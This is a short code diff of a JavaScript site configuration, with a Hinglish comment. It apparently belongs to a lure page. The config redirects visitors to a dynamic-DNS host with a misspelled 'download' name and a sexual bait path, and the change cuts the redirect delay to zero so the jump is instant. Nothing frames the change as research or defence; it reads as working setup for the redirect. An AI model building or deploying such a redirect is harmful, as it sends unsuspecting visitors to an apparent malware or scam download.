@@ -9,5 +9,5 @@ const SITE_CONFIG = {
   redirectUrl: "https://appdowwnload.duckdns.org/sexy/0d7d2a7074",
 
   // Redirect hone se pehle kitne second wait karega (0 se koi bhi number)
-  delaySeconds: 1
+  delaySeconds: 0
 };
